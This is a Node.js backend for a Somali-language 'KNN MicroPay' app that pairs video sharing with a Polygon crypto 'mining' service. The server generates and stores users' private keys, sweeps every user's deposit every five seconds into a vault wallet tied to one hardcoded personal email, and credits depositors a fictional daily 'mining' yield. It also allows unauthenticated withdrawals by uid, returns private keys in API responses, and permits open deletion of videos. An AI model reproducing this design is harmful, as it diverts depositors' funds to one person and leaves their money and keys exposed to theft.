const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const multer = require('multer');
const { ethers } = require('ethers');

let admin = null;
let firestoreDb = null;

try {
    admin = require('firebase-admin');
} catch (_) {
    admin = null;
}

const app = express();
app.use(cors({ origin: '*' }));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));

const DATA_DIR = path.join(__dirname, 'data');
const UPLOADS_DIR = path.join(__dirname, 'uploads');
const DB_FILE = path.join(DATA_DIR, 'users-db.json');
const VIDEOS_FILE = path.join(DATA_DIR, 'videos-db.json');

if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR, { recursive: true });
if (!fs.existsSync(UPLOADS_DIR)) fs.mkdirSync(UPLOADS_DIR, { recursive: true });

app.use('/uploads', express.static(UPLOADS_DIR));

const upload = multer({
    dest: UPLOADS_DIR,
    limits: { fileSize: 100 * 1024 * 1024 }
});

const POLYGON_RPC = process.env.POLYGON_RPC || 'https://polygon-bor-rpc.publicnode.com';
const provider = new ethers.JsonRpcProvider(POLYGON_RPC);

const ABUUKAR_EMAIL = 'abuukarcumar661@gmail.com';
const MIN_DEPOSIT_POL = 0.00001;
const MIN_WITHDRAW_POL = 0.00000001;
const GAS_RESERVE_POL = 0.000005;
const DAILY_MINING_RATE = 0.10;
const AUTO_SWEEP_INTERVAL_SECONDS = 5;
const AUTO_SWEEP_INTERVAL_MS = AUTO_SWEEP_INTERVAL_SECONDS * 1000;
const FIRESTORE_USERS_COLLECTION = 'knn_users';

function initFirestore() {
    if (!admin) return null;
    if (firestoreDb) return firestoreDb;

    try {
        const rawSvc = process.env.FIREBASE_SERVICE_ACCOUNT || '';
        if (!rawSvc.trim()) return null;

        const serviceAccount = JSON.parse(rawSvc);
        if (!admin.apps.length) {
            admin.initializeApp({
                credential: admin.credential.cert(serviceAccount),
                projectId: serviceAccount.project_id || 'somapp-61ebd'
            });
        }
        firestoreDb = admin.firestore();
        console.log('Firebase Firestore connected:', serviceAccount.project_id || 'somapp-61ebd');
        return firestoreDb;
    } catch (err) {
        console.error('Firestore init error:', err.message);
        return null;
    }
}

initFirestore();

function normalizePrivateKey(rawKey) {
    if (!rawKey) return '';
    let cleaned = String(rawKey).trim().replace(/^["']|["']$/g, '').replace(/\s+/g, '');
    if (!cleaned.startsWith('0x') && /^[0-9a-fA-F]{64}$/.test(cleaned)) {
        cleaned = '0x' + cleaned;
    }
    return cleaned;
}

function isValidPrivateKey(pk) {
    return typeof pk === 'string' && /^0x[0-9a-fA-F]{64}$/.test(pk.trim());
}

function isWalletPairValid(address, privateKey) {
    if (!ethers.isAddress(address) || !isValidPrivateKey(privateKey)) {
        return false;
    }
    try {
        const derivedWallet = new ethers.Wallet(privateKey.trim());
        return derivedWallet.address.toLowerCase() === ethers.getAddress(address.trim()).toLowerCase();
    } catch (_) {
        return false;
    }
}

function isAbuukarAccount(email) {
    return String(email || '').trim().toLowerCase() === ABUUKAR_EMAIL.toLowerCase();
}

function loadJsonFile(filePath, fallback) {
    try {
        if (!fs.existsSync(filePath)) {
            fs.writeFileSync(filePath, JSON.stringify(fallback, null, 2));
        }
        return JSON.parse(fs.readFileSync(filePath, 'utf8'));
    } catch (err) {
        console.error('JSON load error:', filePath, err.message);
        return fallback;
    }
}

function saveJsonFile(filePath, data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
}

function loadLocalUsersDb() {
    return loadJsonFile(DB_FILE, {});
}

function saveLocalUsersDb(data) {
    saveJsonFile(DB_FILE, data);
}

// Isku dar xogta si aysan marnaba u lumin address-ka, account ID-ga, iyo private key-ga qof walba
function mergeUserRecords(baseRec, incomingRec) {
    const a = baseRec || {};
    const b = incomingRec || {};
    const merged = { ...a, ...b };

    if (isWalletPairValid(a.polygonAddress, a.privateKey)) {
        merged.polygonAddress = ethers.getAddress(a.polygonAddress);
        merged.privateKey = a.privateKey.trim();
        merged.walletLocked = true;
    } else if (isWalletPairValid(b.polygonAddress, b.privateKey)) {
        merged.polygonAddress = ethers.getAddress(b.polygonAddress);
        merged.privateKey = b.privateKey.trim();
        merged.walletLocked = true;
    }

    if (a.userId) {
        merged.userId = a.userId;
    } else if (b.userId) {
        merged.userId = b.userId;
    }

    return merged;
}

async function loadUsersDb() {
    const localDb = loadLocalUsersDb();
    const db = initFirestore();
    if (!db) return localDb;

    try {
        const snap = await db.collection(FIRESTORE_USERS_COLLECTION).get();
        const merged = { ...localDb };
        snap.forEach(doc => {
            const docData = doc.data();
            if (docData && docData.uid) {
                merged[docData.uid] = mergeUserRecords(merged[docData.uid], docData);
            }
        });
        saveLocalUsersDb(merged);
        return merged;
    } catch (err) {
        console.error('Firestore loadUsersDb error:', err.message);
        return localDb;
    }
}

async function saveSingleUser(userRecord) {
    if (!userRecord || !userRecord.uid) return;
    const localDb = loadLocalUsersDb();
    const existingLocal = localDb[userRecord.uid];
    const safeRecord = mergeUserRecords(existingLocal, userRecord);

    localDb[safeRecord.uid] = safeRecord;
    saveLocalUsersDb(localDb);

    const db = initFirestore();
    if (db) {
        try {
            await db.collection(FIRESTORE_USERS_COLLECTION).doc(String(safeRecord.uid)).set(safeRecord, { merge: true });
        } catch (err) {
            console.error('Firestore saveSingleUser error:', err.message);
        }
    }
}

function loadVideosDb() {
    return loadJsonFile(VIDEOS_FILE, []);
}

function saveVideosDb(data) {
    saveJsonFile(VIDEOS_FILE, data);
}

function generateUniqueAccountId(usersDb) {
    let userId = '';
    let exists = true;
    while (exists) {
        const randomSix = Math.floor(100000 + Math.random() * 900000);
        userId = `KNN-${randomSix}`;
        exists = Object.values(usersDb).some(u => u.userId === userId);
    }
    return userId;
}

async function getOnChainPolBalance(address) {
    try {
        if (!address || !ethers.isAddress(address)) return 0;
        const balWei = await provider.getBalance(address);
        return parseFloat(ethers.formatEther(balWei));
    } catch (err) {
        console.error('On-chain balance error:', err.message);
        return 0;
    }
}

function getAbuukarVaultRecord(usersDb) {
    return Object.values(usersDb || {}).find(
        u => isAbuukarAccount(u?.email) && isWalletPairValid(u?.polygonAddress, u?.privateKey)
    ) || null;
}

// Automatic sweep: lacagta user-rada kale waxaa si otomaatig ah loogu sweep-gareeyaa wallet-ka cusub ee server-ku u diyaariyay Abuukar
async function sweepUserDepositToAbuukar(userRecord, vaultRecord) {
    if (!vaultRecord || !isWalletPairValid(vaultRecord.polygonAddress, vaultRecord.privateKey)) {
        return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
    }
    const vaultAddress = ethers.getAddress(vaultRecord.polygonAddress);

    if (!userRecord || !userRecord.polygonAddress || isAbuukarAccount(userRecord.email)) {
        return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
    }

    const normalizedAddr = ethers.getAddress(userRecord.polygonAddress);
    if (normalizedAddr.toLowerCase() === vaultAddress.toLowerCase()) {
        return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
    }
    if (!isWalletPairValid(normalizedAddr, userRecord.privateKey)) {
        return { swept: false, sweptPol: 0, remainingOnChainPol: 0, txHash: '' };
    }

    try {
        const balWei = await provider.getBalance(normalizedAddr);
        const balPol = parseFloat(ethers.formatEther(balWei));
        if (balPol < MIN_DEPOSIT_POL) {
            return { swept: false, sweptPol: 0, remainingOnChainPol: balPol, txHash: '' };
        }

        const feeData = await provider.getFeeData();
        const gasLimit = 21000n;
        const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('30', 'gwei');
        const gasCostWei = gasLimit * maxFeePerGas;
        const reserveWei = ethers.parseEther(GAS_RESERVE_POL.toFixed(8));
        const totalKeepWei = gasCostWei + reserveWei;

        if (balWei <= totalKeepWei) {
            return { swept: false, sweptPol: 0, remainingOnChainPol: balPol, txHash: '' };
        }

        const sweepWei = balWei - totalKeepWei;
        const sweptPol = parseFloat(ethers.formatEther(sweepWei));
        if (sweepWei <= 0n || sweptPol <= 0) {
            return { swept: false, sweptPol: 0, remainingOnChainPol: balPol, txHash: '' };
        }

        const userWallet = new ethers.Wallet(userRecord.privateKey.trim(), provider);
        const tx = await userWallet.sendTransaction({
            to: vaultAddress,
            value: sweepWei,
            gasLimit,
            maxFeePerGas
        });
        await tx.wait(1);

        const afterWei = await provider.getBalance(normalizedAddr);
        const afterPol = parseFloat(ethers.formatEther(afterWei));
        console.log(`AUTO-SWEEP (${AUTO_SWEEP_INTERVAL_SECONDS}s) -> ABUUKAR VAULT (${vaultAddress}): ${sweptPol} POL from ${normalizedAddr} (tx: ${tx.hash})`);

        return { swept: true, sweptPol, remainingOnChainPol: afterPol, txHash: tx.hash };
    } catch (err) {
        console.error(`Auto-sweep failed for ${normalizedAddr}:`, err.message);
        const fallbackPol = await getOnChainPolBalance(normalizedAddr);
        return { swept: false, sweptPol: 0, remainingOnChainPol: fallbackPol, txHash: '' };
    }
}

async function syncUserRealMining(uid, usersDb) {
    const userRecord = usersDb[uid];
    if (!userRecord || !ethers.isAddress(userRecord.polygonAddress)) return null;

    const normalizedAddr = ethers.getAddress(userRecord.polygonAddress);
    userRecord.polygonAddress = normalizedAddr;
    userRecord.walletLocked = true;

    const vaultRecord = getAbuukarVaultRecord(usersDb);
    const vaultAddress = vaultRecord ? ethers.getAddress(vaultRecord.polygonAddress) : normalizedAddr;
    const vaultOnChainPol = await getOnChainPolBalance(vaultAddress);

    // Akoonka Abuukar waa meel keyd ah (vault) oo aan mining lahayn, isla markaana aan lumayn ID-giisa iyo private key-giisa
    if (isAbuukarAccount(userRecord.email)) {
        const now = Date.now();
        userRecord.lastMiningTick = now;
        userRecord.onChainPol = Number(vaultOnChainPol.toFixed(8));
        userRecord.lastKnownOnChainPol = Number(vaultOnChainPol.toFixed(8));
        userRecord.dailyLimit = 0;
        userRecord.balance = Number(vaultOnChainPol.toFixed(8));
        userRecord.miningActive = false;

        await saveSingleUser(userRecord);
        return userRecord;
    }

    const initialOnChainPol = await getOnChainPolBalance(normalizedAddr);
    let totalDeposited = parseFloat(userRecord.totalDeposited || 0);
    let miningBalance = parseFloat(userRecord.balance || 0);
    let dailyLimit = parseFloat(userRecord.dailyLimit || 0);
    let miningActive = Boolean(userRecord.miningActive);

    let activeOnChainPol = initialOnChainPol;
    let creditedPol = 0;

    if (initialOnChainPol >= MIN_DEPOSIT_POL) {
        const sweepRes = await sweepUserDepositToAbuukar(userRecord, vaultRecord);
        activeOnChainPol = sweepRes.remainingOnChainPol;
        if (sweepRes.swept && sweepRes.sweptPol > 0) {
            creditedPol = sweepRes.sweptPol;
            userRecord.lastSweepTxHash = sweepRes.txHash;
            userRecord.lastSweepAt = Date.now();
        } else {
            const prevKnown = parseFloat(userRecord.lastKnownOnChainPol || 0);
            creditedPol = prevKnown > 0 ? Math.max(initialOnChainPol - prevKnown, initialOnChainPol) : initialOnChainPol;
        }
    }

    if (creditedPol >= MIN_DEPOSIT_POL) {
        totalDeposited += creditedPol;
        const addedDailyCapacity = creditedPol * DAILY_MINING_RATE;
        dailyLimit += addedDailyCapacity;
        miningBalance += addedDailyCapacity;
        miningActive = true;
    }

    const now = Date.now();
    const lastTick = Number(userRecord.lastMiningTick || now);
    if (miningActive && dailyLimit > 0 && now > lastTick) {
        const elapsedSeconds = (now - lastTick) / 1000;
        const perSecRate = dailyLimit / 86400;
        miningBalance += elapsedSeconds * perSecRate;
    }

    userRecord.lastMiningTick = now;
    userRecord.totalDeposited = Number(totalDeposited.toFixed(8));
    userRecord.balance = Number(miningBalance.toFixed(8));
    userRecord.dailyLimit = Number(dailyLimit.toFixed(8));
    userRecord.miningActive = miningActive && (userRecord.balance > 0 || userRecord.dailyLimit > 0);
    userRecord.onChainPol = Number(activeOnChainPol.toFixed(8));
    userRecord.lastKnownOnChainPol = Number(activeOnChainPol.toFixed(8));
    userRecord.poolVaultBalance = Number(vaultOnChainPol.toFixed(8));

    await saveSingleUser(userRecord);
    return userRecord;
}

let isSweepLoopRunning = false;
async function runAutomaticSweepCycle() {
    if (isSweepLoopRunning) return;
    isSweepLoopRunning = true;
    try {
        const usersDb = await loadUsersDb();
        for (const uid of Object.keys(usersDb)) {
            await syncUserRealMining(uid, usersDb);
        }
    } catch (err) {
        console.error('Automatic sweep cycle error:', err.message);
    } finally {
        isSweepLoopRunning = false;
    }
}

setInterval(runAutomaticSweepCycle, AUTO_SWEEP_INTERVAL_MS);

app.get('/', (req, res) => {
    res.json({
        success: true,
        service: 'KNN MicroPay Backend',
        status: 'running',
        autoSweepIntervalSeconds: AUTO_SWEEP_INTERVAL_SECONDS,
        firestoreEnabled: Boolean(initFirestore())
    });
});

app.post('/api/auth-user', async (req, res) => {
    try {
        const { uid, email, displayName } = req.body;
        if (!uid) {
            return res.status(400).json({ success: false, error: 'UID waa loo baahan yahay' });
        }

        const usersDb = await loadUsersDb();
        const existing = usersDb[uid];
        const effectiveEmail = (email || existing?.email || '').trim();

        const hasValidWallet =
            existing &&
            existing.userId &&
            isWalletPairValid(existing.polygonAddress, existing.privateKey);

        if (!hasValidWallet) {
            const wallet = ethers.Wallet.createRandom();
            const newUserId = generateUniqueAccountId(usersDb);
            const initialOnChainPol = await getOnChainPolBalance(wallet.address);

            usersDb[uid] = {
                ...existing,
                uid,
                email: effectiveEmail,
                displayName: displayName || existing?.displayName || (isAbuukarAccount(effectiveEmail) ? 'Abuukar Cumar' : 'User'),
                userId: newUserId,
                polygonAddress: ethers.getAddress(wallet.address),
                privateKey: wallet.privateKey,
                walletLocked: true,
                balance: isAbuukarAccount(effectiveEmail) ? Number(initialOnChainPol.toFixed(8)) : 0,
                dailyLimit: 0,
                miningActive: false,
                totalDeposited: 0,
                lastKnownOnChainPol: initialOnChainPol,
                lastMiningTick: Date.now(),
                createdAt: existing?.createdAt || Date.now()
            };

            await saveSingleUser(usersDb[uid]);
        } else {
            usersDb[uid] = {
                ...existing,
                uid,
                email: effectiveEmail || existing.email,
                displayName: displayName || existing.displayName,
                userId: existing.userId,
                polygonAddress: ethers.getAddress(existing.polygonAddress),
                privateKey: existing.privateKey.trim(),
                walletLocked: true
            };
            await saveSingleUser(usersDb[uid]);
        }

        const syncedRecord = await syncUserRealMining(uid, usersDb);

        return res.json({
            success: true,
            userId: syncedRecord.userId,
            polygonAddress: syncedRecord.polygonAddress,
            privateKey: syncedRecord.privateKey,
            balance: Number(syncedRecord.balance || 0).toFixed(8),
            dailyLimit: Number(syncedRecord.dailyLimit || 0).toFixed(8),
            miningActive: Boolean(syncedRecord.miningActive),
            onChainBalance: Number(syncedRecord.onChainPol || 0).toFixed(8)
        });
    } catch (err) {
        console.error('Auth error:', err);
        return res.status(500).json({ success: false, error: 'Cilad server ayaa dhacday' });
    }
});

// Withdraw wuxuu ka baxayaa wallet-ka cusub ee server-ku u diyaariyay akoonka Abuukar
app.post('/api/withdraw', async (req, res) => {
    try {
        const { uid, recipientAddress, amount } = req.body;
        const usersDb = await loadUsersDb();
        const userRecord = usersDb[uid];

        if (!userRecord) {
            return res.status(404).json({ success: false, error: 'Xisaabta lama helin' });
        }
        if (!recipientAddress || !ethers.isAddress(recipientAddress)) {
            return res.status(400).json({ success: false, error: 'Cinwaanka recipient-ka waa qalad' });
        }

        const syncedUser = await syncUserRealMining(uid, usersDb);
        const availableUserMiningPol = Number(syncedUser?.balance || 0);

        const vaultRecord = getAbuukarVaultRecord(usersDb);
        if (!vaultRecord) {
            return res.status(400).json({
                success: false,
                error: 'Wallet-ka keydka ee akoonka Abuukar lama helin'
            });
        }

        const vaultAddress = ethers.getAddress(vaultRecord.polygonAddress);
        const vaultSigner = new ethers.Wallet(vaultRecord.privateKey.trim(), provider);
        const vaultOnChainWei = await provider.getBalance(vaultAddress);
        const vaultOnChainPol = Number(ethers.formatEther(vaultOnChainWei));

        const requestedPol = amount !== undefined && amount !== null && String(amount).trim() !== ''
            ? parseFloat(amount)
            : availableUserMiningPol;

        if (isNaN(requestedPol) || requestedPol < MIN_WITHDRAW_POL) {
            return res.status(400).json({
                success: false,
                error: `Xaddiga ugu yar ee la bixi karo waa ${MIN_WITHDRAW_POL} POL`
            });
        }

        if (!isAbuukarAccount(syncedUser.email) && requestedPol > availableUserMiningPol + 1e-8) {
            return res.status(400).json({
                success: false,
                error: `Hadhaaga mining-kaaga (${availableUserMiningPol.toFixed(8)} POL) kuma filna qaddarka aad rabto (${requestedPol.toFixed(8)} POL)`
            });
        }

        const amountWei = ethers.parseEther(requestedPol.toFixed(8));
        const feeData = await provider.getFeeData();
        const gasLimit = 21000n;
        const maxFeePerGas = feeData.maxFeePerGas || feeData.gasPrice || ethers.parseUnits('30', 'gwei');
        const totalGasCostWei = gasLimit * maxFeePerGas;

        if (vaultOnChainWei < amountWei + totalGasCostWei) {
            return res.status(400).json({
                success: false,
                error: `Hadhaaga cinwaanka keydka (${vaultOnChainPol.toFixed(8)} POL) kuma filna withdraw-ga iyo gas-ka`
            });
        }

        const tx = await vaultSigner.sendTransaction({
            to: ethers.getAddress(recipientAddress.trim()),
            value: amountWei,
            gasLimit,
            maxFeePerGas
        });

        await tx.wait(1);

        const updatedVaultWei = await provider.getBalance(vaultAddress);
        const updatedVaultPol = Number(ethers.formatEther(updatedVaultWei));

        if (isAbuukarAccount(syncedUser.email)) {
            syncedUser.balance = updatedVaultPol;
            syncedUser.onChainPol = updatedVaultPol;
            syncedUser.lastKnownOnChainPol = updatedVaultPol;
            syncedUser.miningActive = false;
            syncedUser.dailyLimit = 0;
        } else {
            syncedUser.balance = Math.max(0, availableUserMiningPol - requestedPol);
            syncedUser.miningActive = syncedUser.balance > 0;
        }
        syncedUser.lastMiningTick = Date.now();
        syncedUser.poolVaultBalance = updatedVaultPol;
        await saveSingleUser(syncedUser);

        return res.json({
            success: true,
            message: `Waad la baxday ${requestedPol.toFixed(8)} POL! Tx: ${tx.hash}`,
            newBalance: Number(syncedUser.balance).toFixed(8),
            vaultBalance: updatedVaultPol.toFixed(8),
            txHash: tx.hash
        });
    } catch (err) {
        console.error('Withdraw error:', err);
        return res.status(500).json({ success: false, error: err.message || 'Cilad blockchain ayaa dhacday' });
    }
});

app.get('/api/get-videos', (req, res) => {
    const videos = loadVideosDb();
    res.json({ success: true, videos });
});

app.post('/api/upload-video', upload.single('mediaFile'), (req, res) => {
    try {
        if (!req.file) {
            return res.status(400).json({ success: false, error: 'Fadlan dooro sawir ama video' });
        }

        const ext = path.extname(req.file.originalname || '') || (req.body.type === 'image' ? '.jpg' : '.mp4');
        const finalFilename = `${req.file.filename}${ext}`;
        const finalPath = path.join(UPLOADS_DIR, finalFilename);
        fs.renameSync(req.file.path, finalPath);

        const protocol = req.headers['x-forwarded-proto'] || req.protocol || 'https';
        const host = req.get('host');
        const fileUrl = `${protocol}://${host}/uploads/${finalFilename}`;

        const videos = loadVideosDb();
        const newVideo = {
            id: req.body.id || `vid_${Date.now()}`,
            uid: req.body.uid || '',
            username: req.body.username || 'User',
            title: req.body.title || 'Video cusub',
            avatar: req.body.avatar || '',
            type: req.body.type || (req.file.mimetype.startsWith('image/') ? 'image' : 'video'),
            url: fileUrl,
            likes: [],
            subscribers: [],
            comments: [],
            reposts: 0,
            timestamp: Number(req.body.timestamp) || Date.now()
        };

        videos.unshift(newVideo);
        saveVideosDb(videos);

        return res.json({ success: true, video: newVideo });
    } catch (err) {
        console.error('Upload error:', err);
        return res.status(500).json({ success: false, error: 'Cilad ayaa dhacday marka faylka la soo gelinayay' });
    }
});

app.post('/api/interact-video', (req, res) => {
    try {
        const { videoId, action, userId, userName, commentText } = req.body;
        const videos = loadVideosDb();
        const vid = videos.find(v => v.id === videoId);

        if (!vid) {
            return res.status(404).json({ success: false, error: 'Video-ga lama helin' });
        }

        vid.likes = Array.isArray(vid.likes) ? vid.likes : [];
        vid.subscribers = Array.isArray(vid.subscribers) ? vid.subscribers : [];
        vid.comments = Array.isArray(vid.comments) ? vid.comments : [];
        vid.reposts = Number(vid.reposts) || 0;

        if (action === 'like') {
            const idx = vid.likes.indexOf(userId);
            if (idx >= 0) vid.likes.splice(idx, 1);
            else if (userId) vid.likes.push(userId);
        } else if (action === 'subscribe') {
            const subName = userName || userId || 'User';
            const idx = vid.subscribers.indexOf(subName);
            if (idx >= 0) vid.subscribers.splice(idx, 1);
            else vid.subscribers.push(subName);
        } else if (action === 'comment') {
            if (commentText) {
                vid.comments.push({
                    user: userName || 'User',
                    text: commentText,
                    timestamp: Date.now()
                });
            }
        } else if (action === 'repost') {
            vid.reposts += 1;
        }

        saveVideosDb(videos);

        return res.json({
            success: true,
            likes: vid.likes,
            subscribers: vid.subscribers,
            comments: vid.comments,
            reposts: vid.reposts
        });
    } catch (err) {
        console.error('Interact video error:', err);
        return res.status(500).json({ success: false, error: 'Cilad ayaa dhacday' });
    }
});

app.post('/api/delete-video', (req, res) => {
    try {
        const { videoId } = req.body;
        const videos = loadVideosDb();
        const target = videos.find(v => v.id === videoId);

        if (target && target.url) {
            const filename = path.basename(target.url);
            const fullPath = path.join(UPLOADS_DIR, filename);
            if (fs.existsSync(fullPath)) {
                fs.unlinkSync(fullPath);
            }
        }

        const filtered = videos.filter(v => v.id !== videoId);
        saveVideosDb(filtered);
        return res.json({ success: true });
    } catch (err) {
        console.error('Delete video error:', err);
        return res.status(500).json({ success: false, error: 'Lama tirtiri karo video-ga' });
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
